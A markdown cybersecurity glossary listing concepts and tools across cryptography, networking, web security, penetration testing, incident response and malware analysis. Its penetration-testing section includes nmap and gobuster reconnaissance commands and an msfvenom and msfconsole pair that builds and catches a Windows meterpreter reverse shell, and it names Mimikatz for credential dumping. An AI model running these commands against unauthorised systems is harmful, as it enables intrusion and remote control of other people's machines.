````markdown
# Comprehensive Cybersecurity Glossary

## Cryptography

### Basic Concepts
- **Encryption**: Process of converting plaintext to ciphertext
- **Decryption**: Process of converting ciphertext back to plaintext
- **Symmetric Encryption**: Same key used for encryption and decryption (e.g., AES)
- **Asymmetric Encryption**: Different keys for encryption/decryption (e.g., RSA)
- **Hashing**: One-way function producing fixed-size output (e.g., MD5, SHA-256)

### Common Tools
- **OpenSSL**: Toolkit for TLS/SSL protocols
- **GPG**: GNU Privacy Guard for encryption and signing
- **HashCat**: Password recovery and cracking tool

## Networking

### Network Protocols
- **TCP/IP**: Core internet protocols
- **UDP**: Connectionless transmission protocol
- **HTTP/HTTPS**: Web protocols
- **DNS**: Domain Name System
- **DHCP**: Dynamic Host Configuration Protocol

### Network Tools
- **Wireshark**: Network protocol analyzer
- **tcpdump**: Command-line packet analyzer
- **netstat**: Network statistics tool
- **ping**: Network connectivity tester
- **traceroute**: Network path tracer

## Network Security

### Defense Tools
- **Firewalls**: 
  - **iptables**: Linux firewall
  - **pf**: macOS/BSD firewall
  - **Windows Defender Firewall**

### Monitoring
- **Snort**: Network intrusion detection system
- **Zeek (Bro)**: Network analysis framework
- **Nagios**: Network monitoring system

## Web Security

### Common Vulnerabilities
- **OWASP Top 10**:
  1. Injection
  2. Broken Authentication
  3. Sensitive Data Exposure
  4. XML External Entities
  5. Broken Access Control
  6. Security Misconfiguration
  7. Cross-Site Scripting (XSS)
  8. Insecure Deserialization
  9. Using Components with Known Vulnerabilities
  10. Insufficient Logging & Monitoring

### Web Testing Tools
- **OWASP ZAP**: Web application security scanner
- **Nikto**: Web server scanner
- **Dirb/Dirbuster**: Web content scanner

## Penetration Testing

### Phases
1. **Reconnaissance**
2. **Scanning**
3. **Gaining Access**
4. **Maintaining Access**
5. **Covering Tracks**

### Common Tools by Phase
#### Reconnaissance
```bash
# Network Discovery
nmap -sn 192.168.1.0/24

# Service Enumeration
nmap -sV -sC <target>

# Web Enumeration
gobuster dir -u http://target -w wordlist.txt
```

#### Exploitation
```bash
# Generate Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe

# Start Handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 4444; exploit"
```

## Windows Security

### Active Directory
- **Domain Controllers**: Central authentication servers
- **Group Policy**: Centralized configuration management
- **LDAP**: Directory access protocol

### Common Attack Tools
- **Mimikatz**: Credential dumping tool
- **PowerSploit**: PowerShell post-exploitation framework
- **BloodHound**: AD relationship visualization

## Linux Security

### System Hardening
- **SELinux/AppArmor**: Mandatory access control
- **fail2ban**: Intrusion prevention
- **auditd**: System auditing

### Command Line Tools
```bash
# File System Monitoring
sudo ausearch -f /etc/passwd

# Process Monitoring
ps aux | grep root

# Network Monitoring
netstat -tulpn
```

## Incident Response

### Phases
1. **Preparation**
2. **Identification**
3. **Containment**
4. **Eradication**
5. **Recovery**
6. **Lessons Learned**

### Tools
- **Volatility**: Memory forensics
- **The Sleuth Kit**: Disk forensics
- **LogStash**: Log collection and parsing

## Malware Analysis

### Types
- **Static Analysis**: Examining without execution
- **Dynamic Analysis**: Runtime analysis
- **Memory Analysis**: RAM examination

### Tools
- **IDA Pro**: Disassembler
- **Ghidra**: Software reverse engineering
- **Cuckoo**: Automated malware analysis

## Best Practices

### General Security
1. Principle of Least Privilege
2. Defense in Depth
3. Regular Updates/Patching
4. Strong Authentication
5. Regular Backups
6. Security Awareness Training

### Documentation
1. Maintain detailed logs
2. Document configurations
3. Keep incident response plans updated
4. Regular security assessments
````
